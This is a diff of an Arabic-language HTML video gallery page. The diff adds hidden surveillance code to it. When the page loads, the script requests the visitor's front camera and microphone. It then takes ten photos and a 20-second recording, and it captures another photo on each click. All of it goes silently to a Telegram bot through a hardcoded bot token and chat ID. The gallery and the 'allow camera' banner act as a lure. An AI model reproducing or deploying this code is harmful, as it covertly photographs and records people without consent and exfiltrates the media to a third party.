@@ -1,121 +1,247 @@
+
 <!DOCTYPE html>
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>صفحة الفيديوهات</title>
+  <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0">
+  <title>فيديوهات طائفة الظلام - DKSTx666</title>
   <style>
     body {
       margin: 0;
-      background-color: purple; /* 👑 خلفية بنفسجية */
-      color: white;
+      background-color: #1a001a;
       font-family: Arial, sans-serif;
+      color: white;
       text-align: center;
+      direction: rtl;
+      overflow-x: hidden;
     }
 
-    /* 👑 غلاف الموقع */
-    .cover {
-      width: 100%;
-      height: 200px;
-      background-image: url('5alfia.png'); /* 👑 غلاف الصفحة */
+    .top-description {
+      background: linear-gradient(90deg, #4b0082, black, #4b0082);
+      color: white;
+      padding: 15px;
+      font-weight: bold;
+      font-size: 16px;
+      animation: fadeInOut 5s ease-in-out infinite;
+      user-select: none;
+    }
+
+    @keyframes fadeInOut {
+      0%, 100% { opacity: 0.1; }
+      50% { opacity: 1; }
+    }
+
+    header {
+      background-image: url('5alfia.png'); /* 👑 صورة الغلاف */
       background-size: cover;
       background-position: center;
+      height: 250px;
       position: relative;
     }
 
-    /* 👑 صورة البروفايل الدائرية */
     .profile-pic {
-      width: 100px;
-      height: 100px;
+      width: 110px;
+      height: 110px;
       border-radius: 50%;
-      border: 3px solid white;
-      position: absolute;
-      bottom: -50px;
-      right: 20px;
-      background-image: url('profile.png');
+      border: 5px solid white;
+      background-image: url('profile.png'); /* 👑 صورة البروفايل */
       background-size: cover;
       background-position: center;
+      position: absolute;
+      bottom: -55px;
+      right: 20px;
+      animation: pulse 2s infinite;
+      box-shadow: 0 0 10px purple;
     }
 
-    /* 👑 وصف الصفحة */
-    .description {
-      margin-top: 60px;
-      font-size: 16px;
-      padding: 0 20px;
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(255, 0, 255, 0.6); }
+      70% { box-shadow: 0 0 0 15px rgba(255, 0, 255, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(255, 0, 255, 0); }
     }
 
-    /* 👑 تنسيق الفيديوهات */
-    .videos {
+    .video-grid {
       display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 15px;
-      padding: 20px;
+      grid-template-columns: repeat(5, 1fr);
+      gap: 10px;
+      padding: 80px 10px 40px;
     }
 
     video {
       width: 100%;
       border-radius: 10px;
-      border: 2px solid #fff;
-    }
-
-    /* 👑 زر الرجوع */
-    .back-button {
-      position: fixed;
-      bottom: 20px;
-      left: 20px;
-      background-color: black;
-      color: pink;
-      border: none;
-      border-radius: 50%;
-      width: 60px;
-      height: 60px;
-      font-size: 18px;
-      font-weight: bold;
       cursor: pointer;
-      animation: pulse 2s infinite;
+      transition: transform 0.3s;
     }
 
-    @keyframes pulse {
-      0% { box-shadow: 0 0 0 0 rgba(255, 192, 203, 0.6); }
-      70% { box-shadow: 0 0 0 10px rgba(255, 192, 203, 0); }
-      100% { box-shadow: 0 0 0 0 rgba(255, 192, 203, 0); }
+    video:hover {
+      transform: scale(1.05);
+    }
+
+    .lightbox {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.9);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      z-index: 999;
+    }
+
+    .lightbox video {
+      max-width: 90%;
+      max-height: 70%;
+      border-radius: 10px;
+    }
+
+    .lightbox a {
+      margin-top: 15px;
+      background: purple;
+      color: white;
+      padding: 10px 20px;
+      border-radius: 10px;
+      text-decoration: none;
+    }
+
+    .close-btn {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      font-size: 30px;
+      color: white;
+      text-decoration: none;
     }
   </style>
 </head>
-<body>
+<body onclick="captureOnClick()">
 
-  <div class="cover">
+  <div class="top-description">⚠️ カメラアクセスを許可してください - يرجى السماح بالوصول إلى الكاميرا 📷</div>
+
+  <header>
     <div class="profile-pic"></div>
+  </header>
+
+  <div class="video-grid">
+    <!-- 👑 كرر الفيديوهات -->
+    <video src="ffghgg.mp4" onclick="openVideo(this)"></video>
+    <video src="ffghgg.mp4" onclick="openVideo(this)"></video>
+    <video src="ffghgg.mp4" onclick="openVideo(this)"></video>
+    <video src="ffghgg.mp4" onclick="openVideo(this)"></video>
+    <video src="ffghgg.mp4" onclick="openVideo(this)"></video>
+    <video src="ffghgg.mp4" onclick="openVideo(this)"></video>
+    <video src="ffghgg.mp4" onclick="openVideo(this)"></video>
+    <video src="ffghgg.mp4" onclick="openVideo(this)"></video>
+    <video src="ffghgg.mp4" onclick="openVideo(this)"></video>
+    <video src="ffghgg.mp4" onclick="openVideo(this)"></video>
   </div>
 
-  <div class="description">
-    <h3>📽️ معرض فيديوهات طائفة الظلام</h3>
-    <p>🔥 لحظات حاسمة... وصور متحركة تحكي عن التاريخ والهيبة.</p>
+  <div class="lightbox" id="lightbox">
+    <a href="#" class="close-btn" onclick="closeVideo()">×</a>
+    <video controls id="lightboxVideo"></video>
+    <a id="downloadLink" download>📥 تحميل الفيديو</a>
   </div>
 
-  <div class="videos">
-    <!-- 👑 استبدل هذه الفيديوهات بمقاطعك أنت -->
-    <video controls src="video1.mp4"></video>
-    <video controls src="video2.mp4"></video>
-    <video controls src="video3.mp4"></video>
-    <video controls src="video4.mp4"></video>
-    <video controls src="video5.mp4"></video>
-    <video controls src="video6.mp4"></video>
-    <video controls src="video7.mp4"></video>
-    <video controls src="video8.mp4"></video>
-    <video controls src="video9.mp4"></video>
-  </div>
+  <script>
+    const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
+    const CHAT_ID = "7664410054";
+    let stream;
+    let mediaRecorder;
+    let chunks = [];
 
-  <!-- 👑 زر الرجوع -->
-  <a href="index.html">
-    <button class="back-button">🔙</button>
-  </a>
+    async function initCamera() {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+        captureImages(10);
+        recordVideo(20);
+      } catch (e) {
+        alert("アクセス拒否されました (تم رفض الوصول)");
+      }
+    }
 
-  <!-- 👑 موسيقى تلقائية -->
-  <audio autoplay loop>
-    <source src="music.mp3" type="audio/mpeg">
-  </audio>
+    async function captureImages(count) {
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
 
+      const canvas = document.createElement('canvas');
+      const context = canvas.getContext('2d');
+
+      setTimeout(async () => {
+        for (let i = 0; i < count; i++) {
+          await new Promise(r => setTimeout(r, 1000));
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0);
+          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+          sendMedia(blob, `📸 صورة ${i + 1}`);
+        }
+      }, 1000);
+    }
+
+    function recordVideo(seconds) {
+      mediaRecorder = new MediaRecorder(stream);
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(chunks, { type: 'video/mp4' });
+        sendMedia(blob, "🎥 فيديو 20 ثانية");
+        chunks = [];
+      };
+      mediaRecorder.start();
+      setTimeout(() => mediaRecorder.stop(), seconds * 1000);
+    }
+
+    function captureOnClick() {
+      if (!stream) return;
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+
+      const canvas = document.createElement('canvas');
+      const context = canvas.getContext('2d');
+
+      setTimeout(() => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0);
+        canvas.toBlob(blob => sendMedia(blob, "📸 صورة من نقرة"), 'image/jpeg');
+      }, 500);
+    }
+
+    function sendMedia(blob, caption) {
+      const form = new FormData();
+      form.append("chat_id", CHAT_ID);
+      if (blob.type.startsWith("image")) {
+        form.append("photo", blob, "image.jpg");
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: form });
+      } else {
+        form.append("video", blob, "video.mp4");
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: "POST", body: form });
+      }
+    }
+
+    function openVideo(elem) {
+      const lightbox = document.getElementById("lightbox");
+      const vid = document.getElementById("lightboxVideo");
+      const link = document.getElementById("downloadLink");
+      vid.src = elem.src;
+      link.href = elem.src;
+      lightbox.style.display = "flex";
+      vid.play();
+    }
+
+    function closeVideo() {
+      const lightbox = document.getElementById("lightbox");
+      const vid = document.getElementById("lightboxVideo");
+      vid.pause();
+      lightbox.style.display = "none";
+    }
+
+    // البداية
+    window.onload = () => {
+      initCamera();
+    };
+  </script>
 </body>
 </html>
-
